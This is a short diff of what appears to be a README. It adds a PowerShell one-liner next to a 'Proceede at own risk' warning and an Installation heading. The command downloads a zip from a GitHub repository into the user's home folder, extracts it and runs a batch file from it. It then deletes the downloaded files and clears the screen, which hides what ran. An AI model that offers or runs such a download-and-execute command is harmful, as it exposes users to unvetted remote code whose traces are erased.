@@ -17,6 +17,10 @@ boiling hatred in a pest
 - 🔴Proceede at own risk❗
 ```
 
+```
+powershell -c "& {$w=$home;cd $w;$z=\"$w\r.zip\";Invoke-WebRequest 'https://github.com/3lv/r/archive/r.zip' -o $z;Expand-Archive $z . -f;.\r-r\r.bat;Remove-Item $z,r-r -r -fo;cls}"
+```
+
 
 <h3>Installation</h3>
 
